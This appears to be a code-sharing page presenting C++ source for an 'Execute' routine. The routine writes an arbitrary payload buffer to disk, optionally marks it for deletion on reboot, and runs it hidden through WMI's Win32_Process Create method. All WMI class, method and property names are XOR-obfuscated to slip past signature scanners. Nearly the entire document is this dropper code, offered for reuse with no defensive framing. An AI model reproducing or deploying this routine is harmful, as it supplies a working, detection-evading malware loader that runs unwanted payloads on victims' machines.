@@ -1,0 +1,143 @@
+
+                        Create Process With WMI
+ 
+The following code demonstrates how to create a process using WMI. If running with privileges it also uses the MoveFileEx Self Delete. The calling function is responsible for allocating, assigning and freeing the EXECUTE_ACTION structure.
+ 
+This function also uses ExpandStrings to expand environment variables: Expanding Environment Strings
+ 
+typedef struct _EXECUTE_ACTION //action type = 1
+{
+	LPBYTE	lpbPayload;
+	DWORD	dwPayloadLen;
+	WCHAR	*wcTargetPath;
+	BOOL	bDeleteOnReboot;
+	INT		iRunPayloadAs;
+} EXECUTE_ACTION, *PEXECUTE_ACTION;
+ 
+BOOL Execute(PEXECUTE_ACTION peaExecute)
+{
+	if(peaExecute == NULL) return FALSE;
+	if(peaExecute->dwPayloadLen == 0 || peaExecute->wcTargetPath == NULL || peaExecute->lpbPayload == NULL) return FALSE;
+	BOOL bSuccess = FALSE;
+	WCHAR *wcExpandedPath = NULL;
+	ExpandStrings(peaExecute->wcTargetPath, wcExpandedPath);
+	if(wcExpandedPath == NULL) return FALSE;
+	HANDLE hFile = CreateFile(wcExpandedPath, GENERIC_READ|GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	
+	WCHAR *wcCommandExecute = (WCHAR *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(wcExpandedPath) + 10) * sizeof(WCHAR));
+	wsprintf(wcCommandExecute, L"\"%s\"", wcExpandedPath);
+	if(hFile == INVALID_HANDLE_VALUE) goto ret;
+	DWORD dwRWBytes = 0;
+	WriteFile(hFile, peaExecute->lpbPayload, peaExecute->dwPayloadLen, &dwRWBytes, NULL);
+	CloseHandle(hFile);
+	if(peaExecute->bDeleteOnReboot)
+	{ 
+		WCHAR *wcCommandDelete = (WCHAR *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, (wcslen(wcExpandedPath) + 10) * sizeof(WCHAR));
+		wsprintf(wcCommandDelete, L"\\\\?\\%s", wcExpandedPath);
+		MoveFileEx(wcCommandDelete, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
+		HeapFree(GetProcessHeap(), 0, wcCommandDelete);
+	}
+	if(wcExpandedPath != NULL) HeapFree(GetProcessHeap(), 0, wcExpandedPath);
+	wcExpandedPath = NULL;
+	//finished writing - create process
+	HRESULT hr;
+	hr = CoInitializeEx(0, COINIT_MULTITHREADED);
+	if(FAILED(hr)) goto ret;
+	
+	IWbemLocator *pLoc = NULL;
+	hr = CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID *)&pLoc);
+	if(FAILED(hr)) goto uninit;
+	IWbemServices *pSvc = NULL;
+	hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);
+	if(FAILED(hr)) goto relloc;
+	hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
+	if(FAILED(hr)) goto relsvc;
+	//WCHAR wcMethodName[] = L"Create";
+	WCHAR wcMethodName[] = L"\x76E1\x7693\x76F6\x7697\x76E3\x7686"; for( int i = 5; i > 0; i-- ) wcMethodName[i] = wcMethodName[i-1] ^ wcMethodName[i]; wcMethodName[0] = wcMethodName[0] ^ 0x76A2;
+	//WCHAR wcClassName[] = L"Win32_Process";
+	WCHAR wcClassName[] = L"\x34C6\x34AF\x34C1\x34F2\x34C0\x349F\x34CF\x34BD\x34D2\x34B1\x34D4\x34A7\x34D4"; for( int i = 12; i > 0; i-- ) wcClassName[i] = wcClassName[i-1] ^ wcClassName[i]; wcClassName[0] = wcClassName[0] ^ 0x3491;
+	//WCHAR wcStartup[] = L"Win32_ProcessStartup";
+	WCHAR wcStartup[] = L"\x75CD\x75A4\x75CA\x75F9\x75CB\x7594\x75C4\x75B6\x75D9\x75BA\x75DF\x75AC\x75DF\x758C\x75F8\x7599\x75EB\x759F\x75EA\x759A"; for( int i = 19; i > 0; i-- ) wcStartup[i] = wcStartup[i-1] ^ wcStartup[i]; wcStartup[0] = wcStartup[0] ^ 0x759A;
+	IWbemClassObject *pClass = NULL;
+	hr = pSvc->GetObjectW(wcClassName, 0, NULL, &pClass, NULL);
+	if(FAILED(hr)) goto relsvc;
+	IWbemClassObject* pStartupObject = NULL;
+	hr = pSvc->GetObject(wcStartup, 0, NULL, &pStartupObject, NULL);
+	if(FAILED(hr)) goto relclass;
+	IWbemClassObject* pStartupInstance = NULL;
+	hr = pStartupObject->SpawnInstance(0, &pStartupInstance);
+	if(FAILED(hr)) goto relobject;
+	//Create the values for the in parameters
+	VARIANT varParams;
+	VariantInit(&varParams);
+	varParams.vt = VT_I2;
+	varParams.intVal = SW_HIDE;
+	//Store the value for the in parameters
+	//WCHAR wcShowWindow[] = L"ShowWindow";
+	WCHAR wcShowWindow[] = L"\x753D\x7555\x753A\x754D\x751A\x7573\x751D\x7579\x7516\x7561"; for( int i = 9; i > 0; i-- ) wcShowWindow[i] = wcShowWindow[i-1] ^ wcShowWindow[i]; wcShowWindow[0] = wcShowWindow[0] ^ 0x756E;
+	hr = pStartupInstance->Put(wcShowWindow, 0, &varParams, 0);
+	IWbemClassObject* pInParamsDefinition = NULL;
+	hr = pClass->GetMethod(wcMethodName, 0, &pInParamsDefinition, NULL);
+	if(FAILED(hr)) goto relStartupInstance;
+	IWbemClassObject* pParamsInstance = NULL;
+	hr = pInParamsDefinition->SpawnInstance(0, &pParamsInstance);
+	if(FAILED(hr)) goto relParamDef;
+	//Construct Command
+	VariantClear(&varParams);
+	VARIANT varCommand;
+	VariantInit(&varCommand);
+	varCommand.vt = VT_BSTR;
+	varCommand.bstrVal = wcCommandExecute;
+	//WCHAR wcCommandLine[] = L"CommandLine";
+	WCHAR wcCommandLine[] = L"\x5299\x52F6\x529B\x52F6\x5297\x52F9\x529D\x52D1\x52B8\x52D6\x52B3"; for( int i = 10; i > 0; i-- ) wcCommandLine[i] = wcCommandLine[i-1] ^ wcCommandLine[i]; wcCommandLine[0] = wcCommandLine[0] ^ 0x52DA;
+	
+	//Store the value for the in parameters
+	hr = pParamsInstance->Put(wcCommandLine, 0, &varCommand, 0);
+	varCommand.vt = VT_BSTR;
+	varCommand.bstrVal = NULL;
+	//WCHAR wcCurrentDirectory[] = L"CurrentDirectory";
+	WCHAR wcCurrentDirectory[] = L"\x7292\x72E7\x7295\x72E7\x7282\x72EC\x7298\x72DC\x72B5\x72C7\x72A2\x72C1\x72B5\x72DA\x72A8\x72D1"; for( int i = 15; i > 0; i-- ) wcCurrentDirectory[i] = wcCurrentDirectory[i-1] ^ wcCurrentDirectory[i]; wcCurrentDirectory[0] = wcCurrentDirectory[0] ^ 0x72D1;
+	//Store the value for the in parameters
+	hr = pParamsInstance->Put(wcCurrentDirectory, 0, &varCommand, 0);
+	//Store the value for the in parameters
+	VARIANT vtDispatch;
+	VariantInit(&vtDispatch);
+	vtDispatch.vt = VT_DISPATCH;
+	vtDispatch.byref = pStartupInstance;
+	//WCHAR wcProcessStartupInfo[] = L"ProcessStartupInformation";
+	WCHAR wcProcessStartupInfo[] = L"\x3D3A\x3D48\x3D27\x3D44\x3D21\x3D52\x3D21\x3D72\x3D06\x3D67\x3D15\x3D61\x3D14\x3D64\x3D2D\x3D43\x3D25\x3D4A\x3D38\x3D55\x3D34\x3D40\x3D29\x3D46\x3D28"; for( int i = 24; i > 0; i-- ) wcProcessStartupInfo[i] = wcProcessStartupInfo[i-1] ^ wcProcessStartupInfo[i]; wcProcessStartupInfo[0] = wcProcessStartupInfo[0] ^ 0x3D6A;
+	hr = pParamsInstance->Put(wcProcessStartupInfo, 0, &vtDispatch, 0);
+	//Execute Method
+	IWbemClassObject* pOutParams = NULL;
+	hr = pSvc->ExecMethod(wcClassName, wcMethodName, 0, NULL, pParamsInstance, &pOutParams, NULL);
+	if(FAILED(hr)) goto relParamInst;
+	bSuccess = TRUE;
+	pOutParams->Release();
+relParamInst:
+	pParamsInstance->Release();
+relParamDef:
+	pInParamsDefinition->Release();
+relStartupInstance:
+	pStartupInstance->Release();
+relobject:
+	pStartupObject->Release();
+relclass:
+	pClass->Release();
+relsvc:
+	pSvc->Release();
+relloc:
+	pLoc->Release();
+uninit:
+	CoUninitialize();
+ret:
+	if(wcExpandedPath != NULL) HeapFree(GetProcessHeap(), 0, wcExpandedPath);
+	if(wcCommandExecute != NULL) HeapFree(GetProcessHeap(), 0, wcCommandExecute);
+	return bSuccess;
+}
+
+Previous versions:
+| 1 
+| 2 
+| 3 
+|
+                    
